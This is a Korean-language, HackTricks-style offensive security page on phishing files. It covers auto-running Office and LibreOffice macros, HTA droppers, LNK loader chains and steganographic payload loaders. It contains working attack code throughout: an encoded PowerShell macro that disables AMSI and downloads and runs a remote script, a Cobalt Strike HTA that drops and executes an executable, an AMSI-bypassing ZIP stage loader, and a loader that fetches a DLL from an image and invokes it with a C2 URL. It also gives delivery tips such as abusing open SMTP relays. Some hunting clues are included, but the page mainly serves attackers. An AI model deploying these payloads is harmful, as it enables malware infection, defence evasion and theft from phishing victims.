# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word는 파일을 열기 전에 파일 데이터를 검증합니다. 데이터 검증은 OfficeOpenXML 표준을 기준으로 데이터 구조를 식별하는 방식으로 수행됩니다. 데이터 구조 식별 중 오류가 발생하면 분석 중인 파일이 열리지 않습니다.

일반적으로 macros가 포함된 Word 파일은 `.docm` extension을 사용합니다. 그러나 file extension을 변경하여 파일 이름을 바꾸더라도 macro 실행 기능은 그대로 유지할 수 있습니다.\
예를 들어 RTF file은 설계상 macros를 지원하지 않지만, DOCM file의 이름을 RTF로 변경하면 Microsoft Word에서 해당 파일을 처리하며 macro를 실행할 수 있습니다.\
동일한 내부 구조와 메커니즘이 Microsoft Office Suite의 모든 software(Excel, PowerPoint 등)에 적용됩니다.

다음 command를 사용하면 일부 Office programs에서 실행되는 extension을 확인할 수 있습니다:
```bash
assoc | findstr /i "word excel powerp"
```
원격 template를 참조하는 DOCX 파일(File –Options –Add-ins –Manage: Templates –Go)은 macros를 포함하고 있으면 macros를 “실행”할 수도 있습니다.

### 외부 이미지 로드

다음으로 이동합니다: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros 백도어

macros를 사용하여 문서에서 임의의 code를 실행할 수 있습니다.

#### 자동 로드 함수

더 일반적으로 사용되는 함수일수록 AV가 이를 탐지할 가능성이 높습니다.

- AutoOpen()
- Document_Open()

#### Macros Code 예제
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 메타데이터 수동 제거

**File > Info > Inspect Document > Inspect Document**로 이동하면 Document Inspector가 열립니다. **Inspect**를 클릭한 다음 **Document Properties and Personal Information** 옆의 **Remove All**을 클릭합니다.

#### Doc Extension

완료되면 **Save as type** 드롭다운을 선택하고 형식을 **`.docx`**에서 Word 97-2003 **`.doc`**으로 변경합니다.\
**`.docx`**에는 **macro를 저장할 수 없고**, macro-enabled **`.docm`** 확장자에는 **stigma**가 있기 때문입니다(예: thumbnail icon에 큰 `!`가 표시되고 일부 web/email gateway에서는 이를 완전히 차단함). 따라서 이 **legacy `.doc` extension이 가장 적절한 절충안**입니다.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer 문서에는 Basic macros를 포함할 수 있으며, macro를 **Open Document** event에 연결하여 파일이 열릴 때 자동으로 실행할 수 있습니다(Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 간단한 reverse shell macro는 다음과 같습니다:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
문자열 안의 큰따옴표가 두 개(`""`)라는 점에 유의하세요. LibreOffice Basic에서는 리터럴 큰따옴표를 이스케이프하는 데 이를 사용하므로, `...==""")`로 끝나는 payload는 내부 command와 Shell 인자를 모두 올바르게 짝지어 유지합니다.

Delivery tips:

- `.odt`로 저장하고, 문서 event에 macro를 연결하여 문서가 열릴 때 즉시 실행되도록 합니다.
- `swaks`로 이메일을 보낼 때는 `--attach @resume.odt`를 사용하세요(`@`가 필요합니다. 그래야 파일 이름 문자열이 아니라 파일 바이트가 attachment로 전송됩니다). 이는 검증 없이 임의의 `RCPT TO` recipients를 허용하는 SMTP servers를 악용할 때 중요합니다.

## HTA Files

HTA는 **HTML과 scripting languages(예: VBScript 및 JScript)를 결합하는** Windows program입니다. 사용자 interface를 생성하고 browser의 security model 제약 없이 "fully trusted" application으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용하여 실행되며, 일반적으로 **Internet Explorer**와 함께 **설치**되므로 **`mshta`는 IE에 의존합니다**. 따라서 IE가 제거된 경우 HTA를 실행할 수 없습니다.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication 강제

**"원격으로" NTLM authentication을 **강제**하는 방법은 여러 가지가 있습니다. 예를 들어 사용자가 열어볼 이메일이나 HTML에 **보이지 않는 이미지**를 추가할 수 있습니다(HTTP MitM도 가능한가?). 또는 **폴더를 여는 것만으로도** **authentication**을 **트리거**하는 파일의 **주소**를 피해자에게 보낼 수도 있습니다.

**다음 페이지에서 이러한 아이디어와 더 많은 내용을 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

hash 또는 authentication을 훔치는 것뿐만 아니라 **NTLM relay attacks**도 **수행할 수 있다**는 점을 잊지 마세요.

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

매우 효과적인 campaigns은 합법적인 decoy 문서(PDF/DOCX) 2개와 악성 .lnk가 포함된 ZIP을 전달합니다. 핵심은 실제 PowerShell loader가 ZIP의 raw bytes에서 고유한 marker 뒤에 저장되고, .lnk가 이를 추출하여 완전히 메모리에서 실행한다는 것입니다.<sup>[[2]](#references)</sup>

일반적인 .lnk PowerShell one-liner의 flow:

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData% 및 현재 working directory의 parent 등 일반적인 경로에서 원본 ZIP을 찾습니다.
2) ZIP bytes를 읽고 hardcoded marker(예: xFIQCV)를 찾습니다. marker 이후의 모든 내용이 embedded PowerShell payload입니다.
3) ZIP을 %ProgramData%에 복사하고 그곳에서 extract한 다음, 정상적인 것처럼 보이도록 decoy .docx를 엽니다.
4) 현재 process에 대해 AMSI를 bypass합니다: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 다음 stage를 deobfuscate하고(예: 모든 # 문자를 제거) 메모리에서 실행합니다.

embedded stage를 추출하고 실행하는 PowerShell skeleton 예시:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
참고
- Delivery는 평판이 좋은 PaaS 서브도메인(예: *.herokuapp.com)을 악용하는 경우가 많으며, IP/UA에 따라 정상적인 ZIP을 제공하는 등 payload를 gate할 수 있습니다.
- 다음 stage에서는 base64/XOR shellcode를 자주 복호화한 뒤 Reflection.Emit + VirtualAlloc을 통해 실행하여 디스크 흔적을 최소화합니다.

동일한 chain에서 사용되는 Persistence
- Microsoft Web Browser control의 COM TypeLib hijacking을 수행하여 IE/Explorer 또는 이를 embed하는 모든 app이 payload를 자동으로 다시 실행하도록 합니다.<sup>[[2]](#references)[[4]](#references)</sup> 자세한 내용과 바로 사용할 수 있는 commands는 여기에서 확인할 수 있습니다:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- archive data 뒤에 ASCII marker string(예: xFIQCV)이 추가된 ZIP files.
- parent/user folders를 열거하여 ZIP을 찾고 decoy document를 여는 .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed를 통한 AMSI tampering.
- trusted PaaS domains에서 호스팅되는 links로 끝나는 장시간 실행 business threads.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

또 다른 반복되는 pattern은 background에서 실제 chain을 staging하는 동시에 정상적인 lure를 즉시 여는 **document-impersonating `.lnk`**입니다.<sup>[[3]](#references)</sup>

Observed workflow:
1. shortcut은 **PDF로 위장**하고 `conhost.exe` 또는 유사한 proxy를 사용하여 난독화된 PowerShell downloader를 spawn합니다.
2. PowerShell은 명백한 tokens(`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`)을 fragment하므로 `iwr`, `gci`, `ren`, `cpi` 또는 `schtasks`를 찾는 단순한 detections가 command를 놓칩니다.
3. stager는 먼저 **decoy document를 download**하여 victim을 위해 열고, 이후 background에서 malicious files를 재구성합니다.
4. Payloads는 **junk extensions**로 작성된 다음 filler characters를 제거하여 rename될 수 있으며, 이로 인해 명백한 `.exe` / `.cpl` artifacts가 나타나는 시점이 지연됩니다.
5. user-writable path에서 trusted host binary를 launch하는 **minute-based scheduled task**로 Persistence가 설정됩니다.

이 pattern에서 얻을 수 있는 최소한의 hunting clues:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
인식해 두면 유용한 staging layout은 다음과 같습니다:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 또는 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 두 번째 stage가 은밀한 이유

Rapid7 case study에서 scheduled task는 `C:\Users\Public\`의 **`Fondue.exe`**를 반복적으로 실행했습니다. **`APPWIZ.cpl`**이 그 옆에 staging되어 있고 **`RunFODW`**를 export했기 때문에, 신뢰된 Microsoft binary는 정상적인 system copy 대신 attacker의 CPL을 side-load했습니다.

CPL은 다음 작업을 수행합니다:
- `C:\Windows\Tasks\editor.dat`에서 **AES-256-CBC** blob을 읽음
- **Windows CNG / `bcrypt.dll`**을 통해 이를 decrypt함
- executable memory를 할당하고 decrypt된 shellcode를 복사함
- shellcode pointer를 **`EnumUILanguagesW`**의 callback으로 전달하여 간접적으로 실행함

마지막 단계는 별도로 hunting할 가치가 있습니다. malware는 직접적인 `((void(*)())buf)()` jump를 피하고, 대신 **callback을 받는 legitimate WinAPI**를 악용하여 execution을 넘기는 경우가 많습니다.

이 campaign에서 decrypt된 payload는 **Donut** shellcode였으며, 이후 최종 PE를 메모리에서 완전히 mapping하고 현재 process의 **AMSI/WLDP/ETW**를 patch한 뒤 execution을 넘겼습니다. side-loading 및 memory-resident post-processing에 대한 자세한 내용은 다음을 참조하세요:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

실용적인 hunting pivot:
- `powershell.exe` 또는 `conhost.exe`를 spawn한 뒤 눈에 보이는 decoy document를 표시하는 `.lnk`.
- **`C:\Users\Public\`**로의 짧은 수명의 download 후 nonsense extension에서 즉시 rename되는 파일.
- `GoogleErrorReport`와 같이 무해해 보이는 이름을 사용하며 **user-writable directory**에서 실행되는 scheduled task.
- 동일한 non-system directory에서 **`.cpl` / `.dll`** 파일을 load하는 trusted binary.
- **`C:\Windows\Tasks\`** 아래에 기록된 Base64 text blob을 side-loaded module이 이후 읽는 동작.

## 이미지에 steganography-delimited payload를 숨기는 방식 (PowerShell stager)

최근 loader chain은 obfuscated JavaScript/VBS를 전달하며, 이 파일은 Base64 PowerShell stager를 decode하고 실행합니다. 해당 stager는 image(대개 GIF)를 download하며, image에는 고유한 시작/종료 marker 사이에 plain text로 숨겨진 Base64-encoded .NET DLL이 포함되어 있습니다. script는 이러한 delimiter를 검색하고(실제 사례에서 확인된 예: «<<sudo_png>> … <<sudo_odt>>>»), 두 delimiter 사이의 text를 추출한 다음 Base64-decode하여 bytes로 변환하고, assembly를 memory에 load한 뒤 C2 URL과 함께 알려진 entry method를 invoke합니다.<sup>[[5]](#references)</sup>

작업 흐름
- Stage 1: Archived JS/VBS dropper → embedded Base64를 decode → `-nop -w hidden -ep bypass` 옵션으로 PowerShell stager를 launch.
- Stage 2: PowerShell stager → image를 download하고, marker-delimited Base64를 carve한 뒤, .NET DLL을 memory에 load하고 C2 URL 및 options를 전달하여 해당 method를 호출(예: VAI).
- Stage 3: Loader가 최종 payload를 retrieve하고 일반적으로 이를 process hollowing을 통해 trusted binary(주로 MSBuild.exe)에 inject함.<sup>[[7]](#references)[[8]](#references)</sup> process hollowing 및 trusted utility proxy execution에 대한 자세한 내용은 다음을 참조하세요:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

image에서 DLL을 carve하고 memory에서 .NET method를 invoke하는 PowerShell 예시:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

참고
- 이는 ATT&CK T1027.003 (steganography/marker-hiding)입니다.<sup>[[6]](#references)</sup> 마커는 campaign마다 다릅니다.
- assembly를 로드하기 전에 AMSI/ETW bypass 및 string deobfuscation을 적용하는 경우가 많습니다.
- Hunting: 다운로드한 이미지에서 알려진 delimiter를 스캔하고, 이미지에 접근한 직후 Base64 blob을 디코딩하는 PowerShell을 식별합니다.

stego tools 및 carving techniques도 참조하세요:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

반복적으로 관찰되는 initial stage는 archive 내부에 전달되는 작고 강하게 obfuscation된 `.js` 또는 `.vbs` 파일입니다. 유일한 목적은 내장된 Base64 string을 디코딩하고 `-nop -w hidden -ep bypass`를 사용해 PowerShell을 실행하여 HTTPS를 통해 다음 stage를 bootstrap하는 것입니다.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- 자체 파일 내용 읽기
- junk string 사이에 있는 Base64 blob 찾기
- ASCII PowerShell로 디코딩
- `wscript.exe`/`cscript.exe`를 사용해 `powershell.exe` 호출 및 실행

Hunting 단서
- command line에서 `-enc`/`FromBase64String`과 함께 `powershell.exe`를 생성하는 archived JS/VBS attachment.
- user temp path에서 `powershell.exe -nop -w hidden`을 실행하는 `wscript.exe`.

## NTLM hashes를 탈취할 수 있는 Windows files

**NTLM creds를 탈취할 수 있는 위치** 페이지를 확인하세요:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
